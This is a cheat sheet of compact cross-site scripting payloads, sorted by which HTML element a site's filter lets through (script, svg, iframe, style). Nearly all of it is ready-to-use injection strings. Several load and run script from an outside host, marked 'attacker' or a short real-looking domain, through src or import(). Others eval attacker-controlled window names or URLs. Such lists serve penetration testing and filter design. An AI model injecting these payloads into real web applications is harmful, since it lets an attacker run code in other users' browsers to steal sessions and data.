# Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted web sites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

For more details on the different types of XSS flaws, see [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).

## Full List of Vectors
[View GitHub Gist](https://gist.github.com/pr0fg/3283b19f9a3e965fab9d70fb5e3630f2)

## script Element Allowed
```
<script/src=//attacker></script>
```

## svg Element Allowed

Must control URL:
```
<svg/onload=eval(`'`+URL)>
```

Must control `name` variable and unsafe-eval not enabled:
```
<svg/onload=location=name>
```

Firefox only and must control `name` variable:
```
<svg/onload=eval(name)>
```

Uses external script as import, doesn't work in innerHTML unless Firefox. This PoC only works on https and Chrome, because Ǌ.₨ checks for Sec-Fetch-Dest header:
```
<svg/onload=import(/\\Ǌ.₨/)>
```

## iframe Element Allowed

Must control URL:
```
<iframe/onload=eval('`'+URL)>
```

Must control name of the window:
```
<iframe/onload=src=top.name>
```

If the number of iframes on the page is constant:
```
<iframe/onload=src=top[0].name+/\attacker?/>
```

If the number of iframes on the page is dynamic:
```
<iframe/onload=src=contentWindow.name+/\attacker?/>
```

If unsafe-inline is disabled in CSP and external scripts allowed
```
<iframe/srcdoc="<script/src=//attacker></script>">
```

Safari only, must control URL:
```
<iframe/onload=write(URL)>
```

Firefox only:
```
<iframe/srcdoc="<svg><script/href=//attacker />">
```

Uses external script as import. This PoC only works on https and Chrome, because Ǌ.₨ checks for Sec-Fetch-Dest header:
```
<iframe/onload=import(/\\Ǌ.₨/)>
```


## style Element Allowed
```
<style/onload=eval(name)>
```

Must control URL:
```
<style/onload=eval(`'`+URL)>
```

Safari only, must control URL:
```
<style/onload=write(URL)>
```

Uses external script as import, triggers if inline styles are allowed. This PoC only works on https and Chrome, because Ǌ.₨ checks for Sec-Fetch-Dest header:
```
<style/onload=import(/\\Ǌ.₨/)>
```

## style Element Blocked
```
<style/onerror=eval(name)>
```
